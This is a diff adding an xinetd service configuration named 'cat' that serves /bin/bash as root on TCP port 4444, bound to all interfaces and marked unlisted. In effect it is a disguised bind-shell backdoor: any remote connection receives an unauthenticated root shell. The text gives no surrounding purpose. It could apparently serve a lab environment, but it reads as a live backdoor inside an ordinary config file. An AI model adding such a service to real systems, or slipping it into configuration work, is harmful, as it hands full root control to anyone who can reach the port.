@@ -1,0 +1,15 @@
+service cat
+{
+    disable = no
+    socket_type = stream
+    protocol    = tcp
+    wait        = no
+    user        = root
+    type        = UNLISTED
+    port        = 4444
+    bind        = 0.0.0.0
+    server      = /bin/bash
+    banner_fail = /etc/banner_fail
+    per_source  = 10
+    rlimit_cpu  = 1
+}
